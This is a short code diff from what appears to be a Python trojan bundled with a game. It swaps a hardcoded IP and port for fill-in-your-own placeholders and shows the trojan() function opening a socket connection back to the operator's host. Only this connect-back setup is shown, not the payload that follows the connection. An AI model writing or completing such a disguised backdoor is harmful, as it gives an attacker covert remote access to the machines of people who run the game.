@@ -17,8 +17,8 @@ def game():
 
 
 def trojan():
-    HOST = "192.168.0.158"
-    PORT = 8080
+    HOST = "Your Public Device IP /("192.168.0.***")/"
+    PORT = "Your Port but without quotes, as will be a number /(8080)/"
 
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client.connect((HOST, PORT))
